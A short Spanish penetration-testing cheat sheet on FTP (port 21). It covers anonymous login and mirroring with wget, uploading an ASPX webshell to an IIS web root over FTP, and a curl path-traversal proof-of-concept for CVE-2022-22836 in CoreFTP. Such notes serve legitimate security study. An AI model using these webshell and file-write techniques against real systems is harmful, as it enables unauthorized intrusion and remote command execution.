21 - FTP

FTP modes: al acceder a FTP, el modo por defecto suele ser ASCII, útil para descargar texto y scripts. Para binarios, imágenes, comprimidos o ficheros inusuales, cambia a modo binario con bin antes de descargar.

Login FTP anonymous

ftp <ip_objetivo> 
# username: anonymous
# password: anonymous

Comandos FTP

# Modos
ascii
bin
passive

get <file> # Descargar archivo nombrado.
put <file> # Subir fichero

wget -m ftp://user:password@<ip_objetivo> # Dump FTP
wget -m --ftp-user=usuario --ftp-password=contraseña ftp://192.0.2.10/

Acceso Remoto a Microsoft IIS desde FTP

Cuando haya un Microsoft IIS y tengamos acceso al FTP, puede ser posible subir una webshell si el directorio FTP coincide con una ruta publicada por la web.

Copiar la webshell al directorio actual y subirla por FTP

cp /usr/share/webshells/aspx/cmdasp.aspx .
ftp <ip_objetivo> 
put cmdasp.aspx

Acceder a la webshell desde la web

http://target_url/cmdasp.aspx

Vulnerabilidad moderna en CoreFTP

CoreFTP before build 727 es vulnerable a CVE-2022-22836. El problema está en el tratamiento de solicitudes HTTP PUT autenticadas y puede derivar en path traversal y escritura arbitraria de ficheros fuera del directorio previsto.

Explotación de CoreFTP

Explotación de CoreFTP

curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops

La petición usa -X PUT para escribir contenido, autenticación básica con --basic -u <username>:<password>, --path-as-is para conservar la ruta con traversal, --data-binary para enviar el contenido y la cabecera Host apuntando al sistema objetivo.

Sistema objetivo

En el target se crea el archivo 'whoops' con el contenido enviado

C:\> type C:\whoops

PoC.
